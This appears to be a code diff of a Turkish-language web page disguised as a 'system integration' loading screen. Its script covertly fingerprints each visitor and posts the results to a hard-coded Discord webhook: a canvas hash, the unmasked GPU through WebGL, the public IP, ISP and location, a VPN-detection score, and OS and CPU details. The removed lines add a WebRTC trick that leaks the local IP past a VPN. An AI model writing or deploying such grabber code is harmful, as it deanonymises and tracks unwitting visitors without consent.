@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Sistem Entegrasyonu</title>
-    <style>body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }</style>
+    <style>body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }</style>
 </head>
 <body>
     <div style="border:1px solid #111; border-top:1px solid #0f0; border-radius:50%; width:15px; height:15px; animation:s 1s linear infinite;"></div>
@@ -11,72 +11,76 @@
         const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function sızdır() {
-            let info = { vpn: "✅ VPN KAPALI (Fiziksel Doğrulama)", gpu: "X", ven: "X", local: "Tespit Edilemedi" };
-            let leakFound = false;
+            let info = { vpn: "✅ VPN KAPALI (FİZİKSEL DOĞRULAMA)", gpu: "X", ven: "X", hash: "X" };
+            let vpnScore = 0;
 
-            // 1. TEHLİKELİ METOD: WEBRTC LEAK (VPN'i Baypas Eder)
+            // 1. GPU MASKESİNİ KIRMA (Piksel İmza Analizi)
             try {
-                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-                pc.createDataChannel("");
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (i) => {
-                    if (i && i.candidate && i.candidate.candidate) {
-                        const candidate = i.candidate.candidate;
-                        const localIp = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(candidate);
-                        if (localIp) info.local = localIp[1];
-                    }
-                };
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200; canvas.height = 50;
+                ctx.textBaseline = "top";
+                ctx.font = "16px 'Arial'";
+                ctx.fillStyle = "#f60"; ctx.fillRect(100,1,50,20);
+                ctx.fillStyle = "#069"; ctx.fillText("Gpu-Heist-V60", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Gpu-Heist-V60", 4, 17);
+                
+                // Piksellerin parmak izini al (Maske ne olursa olsun değişmez)
+                const pixels = ctx.getImageData(0, 0, 200, 50).data;
+                let hash = 0;
+                for (let i = 0; i < pixels.length; i++) {
+                    hash = ((hash << 5) - hash) + pixels[i];
+                    hash |= 0;
+                }
+                info.hash = Math.abs(hash).toString(16);
             } catch(e) {}
 
-            // 2. CANVAS NOISE (GPU KİMLİK DOĞRULAMA)
+            // 2. DERİN DONANIM SORGUSU (WebGL Bypass)
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                let r = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                let v = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                
-                // Maskelenmiş WebKit/Apple bilgilerini donanım limitleriyle eşle
-                const maxAnisotropy = gl.getExtension('EXT_texture_filter_anisotropic') ? 
-                    gl.getParameter(gl.getExtension('EXT_texture_filter_anisotropic').MAX_TEXTURE_MAX_ANISOTROPY_EXT) : "X";
-                
-                info.gpu = `${r} (MaxAniso: ${maxAnisotropy})`;
-                info.ven = v;
+                info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+
+                if (info.gpu.includes("WebKit")) {
+                    info.gpu = `🍎 Apple/Safari Maskeli (Hash: ${info.hash})`;
+                }
             } catch(e) {}
 
-            // 3. DERİN VPN VE ISS SORGUSU (Zaman Kayması Analizi)
+            // 3. AGRESİF VPN & ISS ANALİZİ
             try {
-                const start = performance.now();
-                const res = await fetch('https://ip-api.com/json/?fields=66846719');
+                const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                const latency = Math.round(performance.now() - start);
                 
                 const sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const ipTz = j.timezone;
 
-                // VPN TESPİTİ (Aggressive)
-                if (j.proxy || j.hosting || sysTz !== ipTz || latency > 1200) {
-                    leakFound = true;
-                    info.vpn = `🚨 **VPN/PROXY ALGILANDI**\n↳ Neden: ${sysTz !== ipTz ? 'Zaman Dilimi Sapması' : 'Sunucu IP tespiti'}\n↳ Sistem: ${sysTz} | IP: ${ipTz}`;
+                if (j.proxy || j.hosting) vpnScore += 5;
+                if (sysTz !== ipTz) vpnScore += 5;
+
+                if (vpnScore >= 5) {
+                    info.vpn = `🚨 **VPN ALGILANDI**\n↳ Neden: ${sysTz !== ipTz ? 'Zaman Dilimi Sapması' : 'Sunucu IP tespiti'}\n↳ Sistem: ${sysTz} | IP: ${ipTz}`;
+                } else {
+                    info.vpn = `✅ **VPN KAPALI (DOĞRULANDI)**\n↳ Sistem saati ve IP lokasyonu (\`${sysTz}\`) kusursuz eşleşiyor.`;
                 }
 
-                info.iss = `${j.isp} (${j.as})`;
-                info.loc = `📍 **Bölge:** ${j.city}, ${j.country}\n🛰️ **ISS:** \`${info.iss}\``;
-                info.ip = j.query;
-            } catch(e) { info.vpn = "⚠️ Analiz Engellendi"; }
+                info.iss = `🌐 **ISS:** \`${j.org}\` (AS${j.asn})`;
+                info.loc = `📍 **Bölge:** ${j.city}, ${j.country_name}`;
+                info.ip = j.ip;
+            } catch(e) { info.vpn = "⚠️ Güvenlik Duvarı Engeli"; }
 
-            // 4. KUSURSUZ PAYLOAD GÖNDERİMİ
+            // 4. KUSURSUZ GÖNDERİM
             const payload = {
                 embeds: [{
-                    title: "💀 ADLİ ANALİZ: OMNISCIENCE-ZERO",
-                    color: leakFound ? 15158332 : 3066993,
+                    title: "💀 ADLİ ANALİZ: BLACK-BOX V60",
+                    color: vpnScore >= 5 ? 15158332 : 3066993,
                     fields: [
                         { name: "🛡️ GÜVENLİK ANALİZİ", value: info.vpn, inline: false },
-                        { name: "📡 AĞ BİLGİLERİ (DEEP SCAN)", value: `${info.loc}\n**Yerel IP:** \`${info.local}\`\n**Genel IP:** \`${info.ip}\``, inline: false },
-                        { name: "🛠️ DONANIM (BYPASS)", value: `**Vendor:** \`${info.ven}\`\n**Renderer:** \`${info.gpu}\``, inline: false },
-                        { name: "⚙️ SİSTEM", value: `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB`, inline: false }
+                        { name: "📡 AĞ BİLGİLERİ", value: `${info.loc}\n🛰️ ${info.iss}\n**Genel IP:** \`${info.ip}\``, inline: false },
+                        { name: "🛠️ DONANIM (FORCE HASH)", value: `**Vendor:** \`${info.ven}\`\n**Renderer:** \`${info.gpu}\`\n**Unique ID:** \`${info.hash}\``, inline: false },
+                        { name: "⚙️ SİSTEM", value: `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Core`, inline: false }
                     ],
-                    footer: { text: "Protocol: Omniscience v50 | Total Heist" },
                     timestamp: new Date()
                 }]
             };
